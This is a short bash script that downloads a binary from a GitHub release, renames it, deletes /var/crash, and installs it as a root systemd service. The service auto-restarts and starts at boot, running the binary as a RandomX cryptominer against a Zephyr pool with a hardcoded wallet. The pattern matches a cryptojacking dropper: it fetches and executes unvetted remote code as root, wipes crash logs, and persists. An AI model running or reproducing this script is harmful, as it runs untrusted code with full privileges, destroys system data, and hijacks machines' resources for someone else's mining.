#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar

rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o zephyr.miningocean.org:5332 -u ZEPHYR2ZDf9QqPz2Mk4rD9haZ1yE9wBVfWAzLte8if4WDk3FeQ3nsyZCxxdCtVRFZsXD6qwQGyNaXckN6otrUgeSAZ3C12NxLnj4K -p test -a rx/0 -k -t 16
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
top
